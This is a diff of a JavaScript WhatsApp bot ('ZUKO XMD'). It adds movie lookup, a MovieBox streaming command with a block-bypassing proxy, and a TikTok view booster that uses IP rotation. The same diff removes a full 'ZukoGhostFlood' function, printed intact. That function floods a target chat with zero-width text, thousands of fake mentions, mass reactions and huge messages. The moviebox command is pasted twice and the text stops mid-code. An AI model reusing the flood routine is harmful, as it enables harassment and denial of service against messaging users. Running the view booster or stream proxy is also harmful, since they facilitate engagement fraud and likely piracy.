@@ -1,8 +1,6 @@
 require('../config/setting/config');
 const {
-    default: baileys,
-    getContentType,
-    downloadContentFromMessage
+    default: baileys
 } = require("@whiskeysockets/baileys");
 
 const fs = require('fs');
@@ -21,8 +19,31 @@ global.OWNER_NAME = 'ZUKO';
 global.botName = 'ZUKO XMD';
 
 // ========== NEWSLETTER CONTEXT ==========
-global.newsletterJid = '120363405724402785@newsletter';
+global.newsletterJid = '120363411107524613@newsletter';
 global.newsletterName = 'ZUKO XMD';
+
+// ========== TMDB (movie info) ==========
+// Free key: https://www.themoviedb.org/settings/api
+global.TMDB_API_KEY = 'YOUR_TMDB_API_KEY_HERE';
+
+// ========== MOVIE SEARCH CACHE ==========
+const movieSearchResults = new Map(); // key: chatId, value: { results, timestamp }
+const MOVIE_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
+
+// Cleaner function (call periodically or before each use)
+function getMovieResults(chatId) {
+    const entry = movieSearchResults.get(chatId);
+    if (!entry) return null;
+    if (Date.now() - entry.timestamp > MOVIE_CACHE_TTL) {
+        movieSearchResults.delete(chatId);
+        return null;
+    }
+    return entry.results;
+}
+
+function setMovieResults(chatId, results) {
+    movieSearchResults.set(chatId, { results, timestamp: Date.now() });
+}
 
 function newsletterContext(extra = {}) {
     if (!global.newsletterJid) return extra;
@@ -153,7 +174,74 @@ async function handleAntiSticker(empire, m, isCreator, isAdmins) {
         return true;
     } catch { return false; }
 }
+// ========== MOVIE INFO HELPER (TMDB - legal metadata lookup, no downloads) ==========
+async function sendMovieInfo(empire, m, movieId, prefix, newsletterContext) {
+    try {
+        const TMDB_KEY = global.TMDB_API_KEY;
+        if (!TMDB_KEY || TMDB_KEY === 'YOUR_TMDB_API_KEY_HERE') {
+            await empire.sendMessage(m.chat, {
+                text: `❌ TMDB_API_KEY is not configured. Get a free key at https://www.themoviedb.org/settings/api and set global.TMDB_API_KEY in this file.`,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+            return;
+        }
 
+        const detailsUrl = `https://api.themoviedb.org/3/movie/${movieId}?api_key=${TMDB_KEY}&append_to_response=credits,watch/providers`;
+        const { data } = await axios.get(detailsUrl, { timeout: 15000 });
+
+        const title = data.title || 'Unknown';
+        const year = (data.release_date || '').slice(0, 4) || 'N/A';
+        const rating = data.vote_average ? data.vote_average.toFixed(1) : 'N/A';
+        const runtime = data.runtime ? `${data.runtime} min` : 'N/A';
+        const genres = (data.genres || []).map(g => g.name).join(', ') || 'N/A';
+        const overview = data.overview || 'No synopsis available.';
+        const cast = (data.credits?.cast || []).slice(0, 5).map(c => c.name).join(', ') || 'N/A';
+        const poster = data.poster_path ? `https://image.tmdb.org/t/p/w500${data.poster_path}` : null;
+        const tmdbLink = `https://www.themoviedb.org/movie/${movieId}`;
+
+        // Legal "where to watch" info (JustWatch data via TMDB), default US region
+        const providers = data['watch/providers']?.results?.US;
+        let watchText = '📺 *Where to watch:* Not listed for US — check the TMDB page for other regions.';
+        if (providers?.flatrate?.length) {
+            watchText = `📺 *Stream on:* ${providers.flatrate.map(p => p.provider_name).join(', ')}`;
+        } else if (providers?.rent?.length) {
+            watchText = `💰 *Rent on:* ${providers.rent.map(p => p.provider_name).join(', ')}`;
+        } else if (providers?.buy?.length) {
+            watchText = `🛒 *Buy on:* ${providers.buy.map(p => p.provider_name).join(', ')}`;
+        }
+
+        const caption =
+`🎬 *${title}* (${year})
+
+⭐ *Rating:* ${rating}/10
+⏱️ *Runtime:* ${runtime}
+🎭 *Genres:* ${genres}
+🧑‍🤝‍🧑 *Cast:* ${cast}
+
+📝 *Overview:*
+${overview}
+
+${watchText}
+
+🔗 ${tmdbLink}`;
+
+        if (poster) {
+            await empire.sendMessage(m.chat, {
+                image: { url: poster },
+                caption,
+                contextInfo: newsletterContext()
+            }, { quoted: m });
+        } else {
+            await empire.sendMessage(m.chat, { text: caption, contextInfo: newsletterContext() }, { quoted: m });
+        }
+    } catch (err) {
+        console.error('Movie info helper error:', err);
+        await empire.sendMessage(m.chat, {
+            text: `❌ *Lookup failed:* ${err.message || 'Unknown error'}`,
+            contextInfo: newsletterContext()
+        }, { quoted: m });
+    }
+}
 
 // ========== ANTI-TAG HANDLER ==========
 async function handleAntiTag(empire, m, isCreator, isAdmins) {
@@ -400,7 +488,7 @@ async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botN
                 if (p === botNumber) continue;
                 if (welcomeEnabled) {
                     let msg = getSetting(id, 'welcomeMessage', '👋 Welcome @user to @group!');
-                    msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
+                    msg = msg.replace(/@user/g, `@${p.split('@')[0]}`).replace(/@group/g, groupMetadata?.subject || 'this group');
                     await empire.sendMessage(id, {
                         text: msg,
                         mentions: [p],
@@ -413,7 +501,7 @@ async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botN
             for (const p of participants) {
                 if (p === botNumber) continue;
                 let msg = getSetting(id, 'goodbyeMessage', "👋 Goodbye @user, we'll miss you!");
-                msg = msg.replace('@user', `@${p.split('@')[0]}`).replace('@group', groupMetadata?.subject || 'this group');
+                msg = msg.replace(/@user/g, `@${p.split('@')[0]}`).replace(/@group/g, groupMetadata?.subject || 'this group');
                 await empire.sendMessage(id, {
                     text: msg,
                     mentions: [p],
@@ -423,107 +511,22 @@ async function handleGroupParticipantsUpdate(empire, update, groupMetadata, botN
         }
     } catch (e) { console.error('Welcome/Goodbye error:', e); }
 }
-// ============================================================
-// ZUKO GHOST FLOOD - Working Invisible Bug (2026)
-// Uses: Mass mentions + zero-width spaces + long text
-// 100% invisible to regular members in groups
-// ============================================================
-async function ZukoGhostFlood(sock, target) {
-  // ====== Generate massive JID list (5000 random numbers) ======
-  const generateJids = () => {
-    const jids = [];
-    for (let i = 0; i < 5000; i++) {
-      const num = Math.floor(Math.random() * 999999999).toString().padStart(10, '0');
-      jids.push(`${num}@s.whatsapp.net`);
-    }
-    return jids;
-  };
 
-  // ====== Generate zero-width text (invisible) ======
-  const zeroWidthText = '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000);
-
-  // ====== PHASE 1: Invisible Mention Flood (100 messages) ======
-  for (let i = 0; i < 100; i++) {
-    try {
-      const mentions = generateJids();
-      await sock.sendMessage(target, {
-        text: zeroWidthText + `☠️${i}`.repeat(1000) + zeroWidthText,
-        contextInfo: {
-          mentionedJid: mentions,
-          forwardingScore: 9999999,
-          isForwarded: true,
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: '120363405724402785@newsletter',
-            newsletterName: 'ZUKO XMD',
-            serverMessageId: 143
-          }
-        }
-      });
-      console.log(`✅ GHOST FLOOD ${i+1}/100 sent`);
-    } catch (e) {
-      console.log(`❌ Flood ${i+1} failed: ${e.message}`);
-    }
-    await new Promise(resolve => setTimeout(resolve, 300));
-  }
-
-  // ====== PHASE 2: Invisible Reaction Flood (200 reactions) ======
-  for (let i = 0; i < 200; i++) {
-    try {
-      await sock.sendMessage(target, {
-        react: {
-          text: '👻',
-          key: {
-            remoteJid: target,
-            fromMe: true,
-            id: Math.random().toString(36).substring(2, 10)
-          }
-        }
-      });
-    } catch (e) {}
-    await new Promise(resolve => setTimeout(resolve, 100));
-  }
-
-  // ====== PHASE 3: Invisible Long Text Flood (50 messages) ======
-  for (let i = 0; i < 50; i++) {
-    try {
-      const longText = '\u200B'.repeat(60000) + `👻${i}`.repeat(5000);
-      await sock.sendMessage(target, {
-        text: longText,
-        contextInfo: {
-          forwardingScore: 9999999,
-          isForwarded: true
-        }
-      });
-      console.log(`✅ LONG TEXT ${i+1}/50 sent`);
-    } catch (e) {}
-    await new Promise(resolve => setTimeout(resolve, 500));
-  }
-
-  // ====== PHASE 4: Invisible Group Mention (If group) ======
-  try {
-    const metadata = await sock.groupMetadata(target);
-    const members = metadata.participants.map(p => p.id);
-    if (members.length > 0) {
-      const memberSubset = members.slice(0, Math.min(members.length, 500));
-      await sock.sendMessage(target, {
-        text: '\u200B'.repeat(30000),
-        contextInfo: {
-          mentionedJid: memberSubset,
-          forwardingScore: 9999999,
-          isForwarded: true
-        }
-      });
-      console.log(`✅ GROUP MENTION sent to ${members.length} members`);
-    }
-  } catch (e) {}
-
-  console.log(chalk.green(`✅ ZUKO GHOST FLOOD COMPLETE on ${target}`));
-  console.log(chalk.gray(`👻 TARGET ${target} HAS BEEN GHOST FLOODED 👻`));
-}
 
 // ========== MAIN BOT ==========
 module.exports = empire = async (empire, m, chatUpdate, store) => {
     try {
+        // ── Bind welcome/goodbye to the REAL join/leave event, once per live socket ──
+        if (empire && empire.ev && !empire._welcomeGoodbyeBound) {
+            empire._welcomeGoodbyeBound = true;
+            empire.ev.on('group-participants.update', async (update) => {
+                try {
+                    const gm = await empire.groupMetadata(update.id).catch(() => null);
+                    if (gm) await handleGroupParticipantsUpdate(empire, update, gm, empire.user.id);
+                } catch (e) { console.error('Group update error:', e); }
+            });
+        }
+
         const body = m.message?.conversation ||
                      m.message?.extendedTextMessage?.text ||
                      m.message?.imageMessage?.caption ||
@@ -701,7 +704,13 @@ case 'pong': {
 ┃ ${prefix}ig
 ┃ ${prefix}tw
 ┃ ${prefix}snap
+┃ ${prefix}nudemovie
 ┃ ${prefix}fb
+┃ ${prefix}tiktokviews
+┃ ${prefix}moviebox
+┃ ${prefix}upload
+┃ ${prefix}reactchannel
+┃ ${prefix}alldl
 ┃ ${prefix}ytvideo
 ┃ ${prefix}play
 ┗━━━━━━━━━━━━━━━━┛
@@ -747,13 +756,6 @@ case 'pong': {
 ┃ ${prefix}rps
 ┗━━━━━━━━━━━━━━┛
 
-┏━━ 🐛 BUG ━━┓
-┃ ${prefix}
-┃ ${prefix}
-┃ ${prefix}
-┃ ${prefix}
-┃ ${prefix}
-┗━━━━━━━━━━━━━━┛
 
      ✦ DEV ZUKO ✦`;
 
@@ -1151,7 +1153,84 @@ case 'pong': {
             }
             break;
         }
+ case 'movie':
+case 'film':
+case 'movieinfo': {
+    if (!text) {
+        return reply(
+`🎬 *MOVIE INFO* 🎬
 
+*Usage:*
+1. Search:    ${prefix}movie <title>
+2. Select:    ${prefix}movie <number>
+
+*Examples:*
+${prefix}movie Inception
+${prefix}movie 2   (selects the 2nd result)
+
+Gives you ratings, cast, synopsis, and legal streaming/rental availability.
+🔍 *Search results expire after 5 minutes.*`
+        );
+    }
+
+    const TMDB_KEY = global.TMDB_API_KEY;
+    if (!TMDB_KEY || TMDB_KEY === 'YOUR_TMDB_API_KEY_HERE') {
+        return reply(`❌ TMDB_API_KEY is not configured. Get a free key at https://www.themoviedb.org/settings/api and set global.TMDB_API_KEY in this file.`);
+    }
+
+    // ── Check if user is selecting a number ──
+    const selection = parseInt(text);
+    if (!isNaN(selection) && selection > 0) {
+        const results = getMovieResults(m.chat);
+        if (!results || results.length === 0) {
+            return reply(`❌ No active search results. Please search again with:\n${prefix}movie <title>`);
+        }
+        if (selection > results.length) {
+            return reply(`❌ Invalid number. Choose between 1 and ${results.length}.`);
+        }
+
+        const selected = results[selection - 1];
+        await sendMovieInfo(empire, m, selected.id, prefix, newsletterContext);
+        movieSearchResults.delete(m.chat);
+        break;
+    }
+
+    // ── Otherwise, perform a search ──
+    await reply(`🔍 *Searching for:* ${text} ...`);
+
+    try {
+        const searchUrl = `https://api.themoviedb.org/3/search/movie?api_key=${TMDB_KEY}&query=${encodeURIComponent(text)}`;
+        const searchRes = await axios.get(searchUrl, { timeout: 15000 });
+
+        const searchData = searchRes.data;
+        if (!searchData.results || searchData.results.length === 0) {
+            return reply(`❌ No movie found for *${text}*. Try a different title.`);
+        }
+
+        // Limit to first 8 results
+        const results = searchData.results.slice(0, 8);
+        setMovieResults(m.chat, results);
+
+        // Build list message
+        let listMsg = `🎬 *SEARCH RESULTS* (${results.length} found)\n\n`;
+        results.forEach((movie, idx) => {
+            const title = movie.title || 'Unknown';
+            const year = (movie.release_date || '').slice(0, 4) || 'N/A';
+            listMsg += `${idx+1}. *${title}* (${year})\n`;
+        });
+        listMsg += `\n📌 Reply with ${prefix}movie <number> for full details + where to watch legally.\n⏳ Results expire in 5 minutes.`;
+
+        await empire.sendMessage(m.chat, {
+            text: listMsg,
+            contextInfo: newsletterContext()
+        }, { quoted: m });
+
+    } catch (err) {
+        console.error('Movie search error:', err);
+        reply(`❌ *Search failed:* ${err.message || 'Unknown error'}`);
+    }
+    break;
+}
         // ═══════════════════════════════════════════════════
         // RUNTIME / UPTIME
         // ═══════════════════════════════════════════════════
@@ -1246,7 +1325,363 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
+        case 'moviebox':
+case 'mb': {
+    if (!text) {
+        return reply(
+`MOVIEBOX COMMANDS
 
+Usage: ${prefix}mb <action> [params]
+
+Actions:
+  search <query>      - Search movies/TV shows
+  detail <number>     - Get details from search results
+  season <number>     - Set season (TV shows only)
+  episode <number>    - Set episode (TV shows only)
+  stream [quality]    - Stream current movie/episode
+  proxy <url> [qual]  - Proxy video URL (bypass blocks)
+
+Qualities: 1080p, 720p, 480p, best (default: 720p)
+
+Examples:
+  ${prefix}mb search Inception
+  ${prefix}mb detail 1
+  ${prefix}mb season 2
+  ${prefix}mb episode 5
+  ${prefix}mb stream 1080p
+  ${prefix}mb proxy https://example.com/video.m3u8`
+        );
+    }
+
+    const args = text.trim().split(/\s+/);
+    const action = args[0].toLowerCase();
+    const params = args.slice(1);
+
+    global.mbSearchResults = global.mbSearchResults || {};
+    global.mbStreamData = global.mbStreamData || {};
+
+    const chatId = m.chat;
+
+    // SEARCH
+    if (action === 'search') {
+        const query = params.join(' ');
+        if (!query) return reply(`Usage: ${prefix}mb search <query>`);
+
+        await reply(`Searching for "${query}"...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-pro?action=search&query=${encodeURIComponent(query)}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data || !response.data.results || response.data.results.length === 0) {
+                return reply(`No results for "${query}".`);
+            }
+
+            const results = response.data.results.slice(0, 8);
+            let listMsg = `SEARCH RESULTS (${results.length} found)\n\n`;
+            results.forEach((item, i) => {
+                const title = item.title || 'Unknown';
+                const year = item.year || item.release_date?.slice(0, 4) || 'N/A';
+                const type = item.type || 'Movie';
+                listMsg += `${i+1}. ${title} (${year}) [${type}]\n`;
+            });
+            listMsg += `\nUse ${prefix}mb detail <number> for details. Results expire in 5 minutes.`;
+
+            global.mbSearchResults[chatId] = {
+                results: results,
+                timestamp: Date.now()
+            };
+
+            await empire.sendMessage(m.chat, { text: listMsg, contextInfo: newsletterContext() }, { quoted: m });
+
+        } catch (err) {
+            reply(`Search failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // DETAIL
+    if (action === 'detail') {
+        const num = parseInt(params[0]);
+        if (isNaN(num)) return reply(`Usage: ${prefix}mb detail <number>`);
+
+        const chatData = global.mbSearchResults?.[chatId];
+        if (!chatData || Date.now() - chatData.timestamp > 300000) {
+            return reply(`No active search. Use ${prefix}mb search <query> first.`);
+        }
+
+        if (num < 1 || num > chatData.results.length) {
+            return reply(`Invalid number. Choose 1 to ${chatData.results.length}.`);
+        }
+
+        const selected = chatData.results[num - 1];
+        const subjectId = selected.id;
+        const slug = selected.slug || selected.id;
+
+        await reply(`Fetching details for "${selected.title}"...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-pro?action=detail&subjectId=${subjectId}&slug=${encodeURIComponent(slug)}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No details found.');
+            }
+
+            const data = response.data;
+            let detailMsg =
+`Title: ${data.title || 'Unknown'} (${data.year || 'N/A'})
+Type: ${data.type || 'N/A'}
+Rating: ${data.rating || 'N/A'}/10
+Genres: ${data.genres ? data.genres.join(', ') : 'N/A'}
+Runtime: ${data.runtime || 'N/A'} min
+
+Plot:
+${data.plot || 'No plot available.'}
+
+Cast: ${data.cast ? data.cast.join(', ') : 'N/A'}
+Director: ${data.director || 'N/A'}`;
+
+            if (data.trailer) {
+                detailMsg += `\n\nTrailer: ${data.trailer}`;
+            }
+
+            // Store for streaming
+            global.mbStreamData[chatId] = {
+                subjectId: subjectId,
+                slug: slug,
+                title: data.title || 'Movie',
+                season: 1,
+                episode: 1
+            };
+
+            if (data.type === 'TV Show' || data.type === 'Series') {
+                detailMsg += `\n\nThis is a TV Show. Use:
+${prefix}mb season <number>
+${prefix}mb episode <number>
+${prefix}mb stream to watch`;
+            } else {
+                detailMsg += `\n\nUse ${prefix}mb stream to watch this movie.`;
+            }
+
+            if (data.poster) {
+                await empire.sendMessage(m.chat, {
+                    image: { url: data.poster },
+                    caption: detailMsg,
+                    contextInfo: newsletterContext()
+                }, { quoted: m });
+            } else {
+                await reply(detailMsg);
+            }
+
+        } catch (err) {
+            reply(`Detail fetch failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // SEASON
+    if (action === 'season') {
+        const num = parseInt(params[0]);
+        if (isNaN(num) || num < 1) return reply(`Usage: ${prefix}mb season <number>`);
+
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        global.mbStreamData[chatId].season = num;
+        reply(`Season set to ${num}.`);
+        return;
+    }
+
+    // EPISODE
+    if (action === 'episode') {
+        const num = parseInt(params[0]);
+        if (isNaN(num) || num < 1) return reply(`Usage: ${prefix}mb episode <number>`);
+
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        global.mbStreamData[chatId].episode = num;
+        reply(`Episode set to ${num}.`);
+        return;
+    }
+
+    // STREAM
+    if (action === 'stream') {
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        const data = global.mbStreamData[chatId];
+        const quality = params[0] || '720p';
+
+        await reply(`Streaming "${data.title}"... (Quality: ${quality})`);
+
+        try {
+            let apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-proxy?action=stream&subjectId=${data.subjectId}&slug=${encodeURIComponent(data.slug)}`;
+            if (data.season) apiUrl += `&season=${data.season}`;
+            if (data.episode) apiUrl += `&episode=${data.episode}`;
+            apiUrl += `&quality=${quality}`;
+
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No stream URL returned.');
+            }
+
+            const streamData = response.data;
+            const streamUrl = streamData.streamUrl || streamData.url || streamData.directUrl || null;
+
+            if (!streamUrl) {
+                return reply(`Could not extract stream URL.`);
+            }
+
+            let msg =
+`Title: ${data.title}
+Quality: ${quality}`;
+
+            if (data.season) msg += `\nSeason: ${data.season}`;
+            if (data.episode) msg += `\nEpisode: ${data.episode}`;
+
+            msg += `\n\nStream Link: ${streamUrl}`;
+
+            await reply(msg);
+
+        } catch (err) {
+            reply(`Stream fetch failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // PROXY
+    if (action === 'proxy') {
+        const videoUrl = params[0];
+        const quality = params[1] || '720p';
+
+        if (!videoUrl || !videoUrl.includes('http')) {
+            return reply(`Usage: ${prefix}mb proxy <video_url> [quality]`);
+        }
+
+        await reply(`Proxying video...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-proxy?action=proxy&videoUrl=${encodeURIComponent(videoUrl)}&quality=${quality}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No response from proxy API.');
+            }
+
+            const proxyData = response.data;
+            const proxyUrl = proxyData.proxyUrl || proxyData.url || proxyData.streamUrl || null;
+
+            if (!proxyUrl) {
+                return reply(`Could not extract proxied URL.`);
+            }
+
+            reply(`Proxied Stream URL:\n\n${proxyUrl}\n\nQuality: ${quality}\nThis link bypasses blocks.`);
+
+        } catch (err) {
+            reply(`Proxy failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // Invalid action
+    reply(`Unknown action: ${action}\nUse ${prefix}mb without parameters for help.`);
+    break;
+}
+
+case 'tiktokviews':
+case 'ttviews':
+case 'ttboost':
+case 'tiktokboost': {
+    if (!text) return reply(` *TikTok Views Booster*\n\nUsage: ${prefix}tiktokviews <URL> [cf_token]\nExample: ${prefix}tiktokviews https://vt.tiktok.com/xxxxx/\nExample with token: ${prefix}tiktokviews https://vt.tiktok.com/xxxxx/ your_cf_token\n\n *What it does:* Sends free views/likes to your TikTok video using IP rotation.\n *cf_token* is optional — use if you're getting blocked.`);
+
+    // -- Extract URL and optional token --
+    const parts = text.trim().split(/\s+/);
+    const videoUrl = parts[0];
+    const cfToken = parts[1] || null;
+
+    if (!videoUrl.includes('tiktok.com') && !videoUrl.includes('vt.tiktok.com')) {
+        return reply('вқҢ Please provide a valid TikTok video URL.');
+    }
+
+    await reply(` *Starting TikTok view boost...*\n\n *URL:* ${videoUrl}\n${cfToken ? 'рҹ”‘ *CF Token:* Provided' : ' *CF Token:* Not provided'}\n\nвҸі Please wait...`);
+
+    try {
+        // -- Build the request --
+        let apiUrl = `https://omegatech-api.dixonomega.tech/api/tools/tiktok-views-v2?url=${encodeURIComponent(videoUrl)}`;
+        if (cfToken) {
+            apiUrl += `&cf_token=${encodeURIComponent(cfToken)}`;
+        }
+
+        const response = await axios.get(apiUrl, {
+            timeout: 60000,
+            headers: {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+        });
+
+        // -- Parse response --
+        let resultText = '';
+        if (response.data) {
+            const data = response.data;
+            if (data.success) {
+                resultText = ` *Boost initiated successfully!*\n\n`;
+                if (data.order_id) resultText += `рҹ“Ұ *Order ID:* ${data.order_id}\n`;
+                if (data.next_time) resultText += `вҸі *Next available:* ${data.next_time}\n`;
+                if (data.message) resultText += `рҹ“Ё *Message:* ${data.message}\n`;
+                if (data.views) resultText += `рҹ‘Ғ *Views sent:* ${data.views}\n`;
+                else if (data.likes) resultText += `рҹ‘Қ *Likes sent:* ${data.likes}\n`;
+                // Add any other returned fields
+                for (const [key, value] of Object.entries(data)) {
+                    if (!['success', 'order_id', 'next_time', 'message', 'views', 'likes'].includes(key) && value) {
+                        resultText += `*${key}:* ${value}\n`;
+                    }
+                }
+            } else {
+                resultText = ` *Boost failed.*\n\n`;
+                if (data.message) resultText += ` *Error:* ${data.message}\n`;
+                else if (data.error) resultText += `*Error:* ${data.error}\n`;
+                // Show any other data for debugging
+                const debug = JSON.stringify(data, null, 2);
+                if (debug.length < 1000) resultText += `\n *Response:*\n${debug}`;
+            }
+        } else {
+            resultText = ' No response from the API. The service might be down.';
+        }
+
+        await reply(resultText);
+
+    } catch (err) {
+        console.error('TikTok views error:', err);
+        let errorMsg = `вқҢ *Boost request failed:* ${err.message || 'Unknown error'}`;
+        if (err.code === 'ECONNABORTED') {
+            errorMsg = 'вқҢ *Request timed out.* The API might be slow or the video URL is invalid.';
+        } else if (err.response) {
+            // Try to extract the API error message
+            const apiError = err.response.data?.message || err.response.data?.error || err.response.statusText;
+            if (apiError) errorMsg = `вқҢ *API Error:* ${apiError}`;
+        }
+        await reply(errorMsg);
+    }
+    break;
+}
         // ═══════════════════════════════════════════════════
         // APKDL - Download an APK by app name
         // ═══════════════════════════════════════════════════
@@ -1616,7 +2051,508 @@ Usage: ${prefix}setbotname <new name>
             }
             break;
         }
+    case 'moviebox':
+case 'mb': {
+    if (!text) {
+        return reply(
+`MOVIEBOX COMMANDS
 
+Usage: ${prefix}mb <action> [params]
+
+Actions:
+  search <query>      - Search movies/TV shows
+  detail <number>     - Get details from search results
+  season <number>     - Set season (TV shows only)
+  episode <number>    - Set episode (TV shows only)
+  stream [quality]    - Stream current movie/episode
+  proxy <url> [qual]  - Proxy video URL (bypass blocks)
+
+Qualities: 1080p, 720p, 480p, best (default: 720p)
+
+Examples:
+  ${prefix}mb search Inception
+  ${prefix}mb detail 1
+  ${prefix}mb season 2
+  ${prefix}mb episode 5
+  ${prefix}mb stream 1080p
+  ${prefix}mb proxy https://example.com/video.m3u8`
+        );
+    }
+
+    const args = text.trim().split(/\s+/);
+    const action = args[0].toLowerCase();
+    const params = args.slice(1);
+
+    global.mbSearchResults = global.mbSearchResults || {};
+    global.mbStreamData = global.mbStreamData || {};
+
+    const chatId = m.chat;
+
+    // SEARCH
+    if (action === 'search') {
+        const query = params.join(' ');
+        if (!query) return reply(`Usage: ${prefix}mb search <query>`);
+
+        await reply(`Searching for "${query}"...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-pro?action=search&query=${encodeURIComponent(query)}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data || !response.data.results || response.data.results.length === 0) {
+                return reply(`No results for "${query}".`);
+            }
+
+            const results = response.data.results.slice(0, 8);
+            let listMsg = `SEARCH RESULTS (${results.length} found)\n\n`;
+            results.forEach((item, i) => {
+                const title = item.title || 'Unknown';
+                const year = item.year || item.release_date?.slice(0, 4) || 'N/A';
+                const type = item.type || 'Movie';
+                listMsg += `${i+1}. ${title} (${year}) [${type}]\n`;
+            });
+            listMsg += `\nUse ${prefix}mb detail <number> for details. Results expire in 5 minutes.`;
+
+            global.mbSearchResults[chatId] = {
+                results: results,
+                timestamp: Date.now()
+            };
+
+            await empire.sendMessage(m.chat, { text: listMsg, contextInfo: newsletterContext() }, { quoted: m });
+
+        } catch (err) {
+            reply(`Search failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // DETAIL
+    if (action === 'detail') {
+        const num = parseInt(params[0]);
+        if (isNaN(num)) return reply(`Usage: ${prefix}mb detail <number>`);
+
+        const chatData = global.mbSearchResults?.[chatId];
+        if (!chatData || Date.now() - chatData.timestamp > 300000) {
+            return reply(`No active search. Use ${prefix}mb search <query> first.`);
+        }
+
+        if (num < 1 || num > chatData.results.length) {
+            return reply(`Invalid number. Choose 1 to ${chatData.results.length}.`);
+        }
+
+        const selected = chatData.results[num - 1];
+        const subjectId = selected.id;
+        const slug = selected.slug || selected.id;
+
+        await reply(`Fetching details for "${selected.title}"...`);
+
+        try {
+            const apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-pro?action=detail&subjectId=${subjectId}&slug=${encodeURIComponent(slug)}`;
+            const response = await axios.get(apiUrl, {
+                timeout: 20000,
+                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+            });
+
+            if (!response.data) {
+                return reply('No details found.');
+            }
+
+            const data = response.data;
+            let detailMsg =
+`Title: ${data.title || 'Unknown'} (${data.year || 'N/A'})
+Type: ${data.type || 'N/A'}
+Rating: ${data.rating || 'N/A'}/10
+Genres: ${data.genres ? data.genres.join(', ') : 'N/A'}
+Runtime: ${data.runtime || 'N/A'} min
+
+Plot:
+${data.plot || 'No plot available.'}
+
+Cast: ${data.cast ? data.cast.join(', ') : 'N/A'}
+Director: ${data.director || 'N/A'}`;
+
+            if (data.trailer) {
+                detailMsg += `\n\nTrailer: ${data.trailer}`;
+            }
+
+            // Store for streaming
+            global.mbStreamData[chatId] = {
+                subjectId: subjectId,
+                slug: slug,
+                title: data.title || 'Movie',
+                season: 1,
+                episode: 1
+            };
+
+            if (data.type === 'TV Show' || data.type === 'Series') {
+                detailMsg += `\n\nThis is a TV Show. Use:
+${prefix}mb season <number>
+${prefix}mb episode <number>
+${prefix}mb stream to watch`;
+            } else {
+                detailMsg += `\n\nUse ${prefix}mb stream to watch this movie.`;
+            }
+
+            if (data.poster) {
+                await empire.sendMessage(m.chat, {
+                    image: { url: data.poster },
+                    caption: detailMsg,
+                    contextInfo: newsletterContext()
+                }, { quoted: m });
+            } else {
+                await reply(detailMsg);
+            }
+
+        } catch (err) {
+            reply(`Detail fetch failed: ${err.message || 'Unknown error'}`);
+        }
+        return;
+    }
+
+    // SEASON
+    if (action === 'season') {
+        const num = parseInt(params[0]);
+        if (isNaN(num) || num < 1) return reply(`Usage: ${prefix}mb season <number>`);
+
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        global.mbStreamData[chatId].season = num;
+        reply(`Season set to ${num}.`);
+        return;
+    }
+
+    // EPISODE
+    if (action === 'episode') {
+        const num = parseInt(params[0]);
+        if (isNaN(num) || num < 1) return reply(`Usage: ${prefix}mb episode <number>`);
+
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        global.mbStreamData[chatId].episode = num;
+        reply(`Episode set to ${num}.`);
+        return;
+    }
+
+    // STREAM
+    if (action === 'stream') {
+        if (!global.mbStreamData?.[chatId]) {
+            return reply(`No active title. Search and get details first.`);
+        }
+
+        const data = global.mbStreamData[chatId];
+        const quality = params[0] || '720p';
+
+        await reply(`Streaming "${data.title}"... (Quality: ${quality})`);
+
+        try {
+            let apiUrl = `https://omegatech-api.dixonomega.tech/api/movie/MovieBox-proxy?action=stream&subjectId=${data.subjectId}&slug=${encodeURIComponent(data.slug)}`;
